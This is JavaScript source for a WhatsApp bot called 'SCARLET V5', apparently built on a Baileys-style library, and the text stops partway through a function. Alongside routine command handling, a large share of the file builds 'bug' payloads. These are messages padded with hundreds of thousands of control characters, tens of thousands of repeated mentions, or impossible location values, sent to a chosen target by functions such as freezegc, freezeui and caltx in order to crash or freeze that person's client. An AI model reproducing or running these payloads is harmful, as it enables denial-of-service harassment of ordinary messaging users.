module.exports = async (bad, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await bad.decodeJid(bad.user.id)
const sender = m.key.fromMe ? (bad.user.id.split(':')[0]+'@s.whatsapp.net' || bad.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await bad.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const NodeCache = require("node-cache");
const pino = require("pino");
const totalFitur = () =>{
            var mytext = fs.readFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const jsobfus = require('javascript-obfuscator');
const { deobfuscate } = require('obfuscator-io-deobfuscator');
const JsConfuser = require('js-confuser')
const tanggal = moment.tz('Africa/Lagos').format('DD/MM/YY')
const Badboi = fs.readFileSync(`./Gallery/Badboi.jpg`)
const scar1 = fs.readFileSync(`./Gallery/scar1.jpg`)
const xcrash = fs.readFileSync(`./Gallery/xcrash.png`)
const darkphonk = fs.readFileSync('./Gallery/Phonk.mp3')
const image1 = fs.readFileSync(`./Gallery/image1.jpg`)
const scarlet = fs.readFileSync('./Gallery/scarlet.jpg')
//encrypt and decrypt 
const aut = "23481"
const th = "4082"
const or = "5959"
const ta = aut + th + or
const similarity = require('similarity')
const util = require('util');
const fetch = require('node-fetch')
const crypto = require('crypto')
const speed = require("performance-now")
const { promisify } = require('util');
const { fromBuffer } = require('file-type')
const didyoumean = require('didyoumean');
const chalk = require('chalk');
const path = require('path')
const archiver = require('archiver');
//spampair code
 //virtex 
const { ngazap } = require('./virtex/ngazap')
const { crash } = require('./virtex/crash')
const { buttonkal } = require('./virtex/buttonkal')
const { cttl } = require('./virtex/cttl')
const { tizi } = require('./virtex/tizi')
const { weg } = require('./virtex/weg')
const { virus7 } = require('./virtex/virus7')
const { notif3 } = require("./virtex/notif3")
const { notif4 } = require("./virtex/notif4")

// Function getcase get Function 
const userSessions = {};

const { teksCrashUi } = require("./virtex/virtex.js")
const { teksInVisiXz } = require("./virtex/delay.js")
const { buttonvirus } = require("./virtex/buttonvirus.js")
const { explosion } = require("./virtex/bugcrash.js")
const { Veoni } = require("./virtex/xnaf.js")
const { old1, old2, old3 } = require("./virtex/bugold.js")
const { Cluex } = require("./virtex/ClueX.js")
//virtex end 
const { Client } = require('ssh2');
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const murbug = JSON.parse(fs.readFileSync("./owner&premium/murbug.json"))
const { teksbug1 } = require("./Badboi/virtex.js")
const { teksbug2 } = require("./Badboi/delay.js")
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const ismurbug = murbug.includes(m.sender)
const resbug = (`ʙᴏᴛ ᴍᴏʀᴇ ᴘʀᴏᴄᴇss ᴡᴀɪᴛ ᴀ ᴍᴏᴍᴇɴᴛ...👑️*`)
const donebug = (`𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝙏𝙃𝙀 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5, 𝙉𝙊𝙒 𝙁𝘼𝘾𝙀 𝙔𝙊𝙐𝙍 𝘿𝙀𝙈𝙄𝙎𝙀!`)
		// IMAGE \\
		//=================================================//
// database security by king badboi 


// update function 
const jam = moment(Date.now()).tz('Africa/Lagos').locale('id').format('HH:mm:ss z')
const penghitung = moment().tz("Africa/Lagos").format("dddd, D MMMM - YYYY")		
//===================[ FUNCTION reply  ]=====================\\
// Function Reply
const reply = (teks) => {
let Toxxiconrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "☌ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 ☌",
newsletterJid: "120363290640941556@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botName, 
body: creatorName,
thumbnailUrl: 'https://i.ibb.co/Pz5CwtY/881.jpg',
sourceUrl: link
},
},
text: teks,
}
return bad.sendMessage(from, Toxxiconrep, {
quoted: fsaluran,
})
}
// antibug function by badboi
// end of antii bugs function by king badboi

// Zenon Quoted 

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363290640941556@newsletter',
    newsletterName: '',
    caption: body
}}}
		const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: scar1,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
// BATAS REPLY

//=========================================
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarity: ${similarityPercentage}%`
m.reply(response)
}}
async function buttonurl(chat, teks, url1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: link + "@newsletter",
newsletterName: `Channel ${version}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: bad.decodeJid(bad.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${version}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": url1
}
],
})})
}}
}, { quoted: jm })

await bad.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function buttonurl2(chat, teks, url1, url2, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: link + "@newsletter",
newsletterName: `Channel ${version}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: bad.decodeJid(bad.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${version}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": url1
},
{
"name": "cta_url",
"buttonParamsJson": url2
}
],
})})
}}
}, { quoted: jm })

await bad.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: link + "@newsletter",
newsletterName: `Channel ${version}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: bad.decodeJid(bad.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${version}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await bad.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await bad.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await bad.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await bad.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await bad.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit5 (tex1, tex2, tex3, tex4, tex5) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`,
`${tex4}`,
`${tex5}`
]
let { key } = await bad.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(900, 1500)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await bad.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function ditt(...texts) {
let { key } = await bad.sendMessage(from, {text: 'Loading...'}, { quoted: m });
let duh = randomNomor(500, 800);
for (let i = 0; i < texts.length; i++) {
await sleep(duh);
await bad.sendMessage(from, {text: texts[i], edit: key}, { quoted: m });
}}


//=================================================//
if (m.message) {
  console.log(
    chalk`
      ${chalk.yellow.bold("╔═════════════════════════════╗")}
      ${chalk.blue.bold("║       ___  𝙎𝘾𝘼𝘾𝙇𝙀𝙏 𝐕5      ║")}
      ${chalk.magenta.bold(`║      ${penghitung} ${jam}      ║`)}
      ${chalk.yellow.bold("╠═════════════════════════════╣")}
      ${chalk.white.bgBlue.bold(`║      FROM: ${pushname}      ║`)}
      ${chalk.white.bgBlue.bold(`║      SENDER ID: ${m.sender}      ║`)}
      ${chalk.yellow.bold("╠═════════════════════════════╣")}
      ${chalk.white.bgMagenta.bold(`║          Text: ${body}          ║`)}
      ${chalk.green.bold("╚═════════════════════════════╝")}
    `
  );
}
const QBug = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };

const TypNul = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    const qcatalog = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from
          ? {
              remoteJid: "@s.whatsapp.net",
            }
          : {}),
      },
      message: {
        orderMessage: {
          orderId: "594071395007984",
          thumbnail: "https://files.catbox.moe/1h6mh7.jpg",
          itemCount: 9741,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "ZYNXZO -",
          orderTitle: "፝ ⃟!𝙏𝙖𝙢𝙖 𝙍𝙮𝙪𝙘𝙞𝙝𝙞!፝⃟",
          sellerJid: "0@s.whatsapp.net",
          token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
          totalAmount1000: "500000000000000",
          totalCurrencyCode: "IDR",
        },
      },
    };
    
    const qdocu = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from
          ? {
              remoteJid: "@s.whatsapp.net",
            }
          : {}),
      },
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
          mimetype: "application/octet-stream",
          fileSha256: "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
          fileLength: "64455",
          pageCount: 1,
          mediaKey: "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
          fileName: "ZYNXZO -" + "ꦾ".repeat(90000),
          fileEncSha256: "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
        },
      },
    };
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (X) => {
return bad.sendMessage(X, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await bad.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: botName
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `© ${global.creatorName} 🇳🇬`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "R/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${creatorName}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By bad`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
        
const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${creatorName}`, jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot JPM By Skzyoo`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak By ShyoDes`,jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${creatorName}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

////////////////////// FUNCTION BUG ENC FULL POWER //////////////////////
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

     async function caroLoc(target, pic, Ptcp = true ) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "-999999999999999999999999999",
            degreesLongitude: "-999999999999999999999999999",
            caption: "‌TRY 💔‌" + "@null".repeat(13000),
            sequenceNumber: "0",
            jpegThumbnail: pic
          }
        },
         carouselMessage: "{}"
      }
    }), {
      userJid: target,
      quoted: EsQl
    });
    await bad.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}
  //=======================
 async function Sinvi(target, Ptcp = true) {
     const userMention = {

        "type": "user",

        "userJid": target,

        "mention": "@" + target.split('@')[0], // This assumes the display name is the part before '@'

    };
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "scarlet 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: "scarlet 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲\n" + userMention.mention.repeat(17000),
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " Spider〽️ "
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: EsQl 
   });

   await bad.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5- 𝐁𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈〽️"));
  };   
  async function freezegc(target) {		
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝐁𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈 " }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await bad.relayMessage(target, etc.message, {});
		}
const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5"
}
}
};
async function freezekamoflase(target) {

    await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 414058.5,
                            degreesLongitude: 131518.0 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ ${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐑𝐞𝐚𝐥🦣" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function caltx(target) {
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								hasMediaAttachment: true,
								text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								title: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
								},
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5" }]
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await bad.relayMessage(target, etc.message, {});
		}
		
async function freezeuii(target) {

    await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function freezeui(target) {

    await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        viewOnceMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0 
                        },
                        hasMediaAttachment: false
                    },
                    body: {
                        text: `𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 ${"@2348140825959 ".repeat(10000)}`,
           "contextInfo": { mentionedJid: [ "2348140825959@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "2348140825959@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function NewsletterZap(target) {
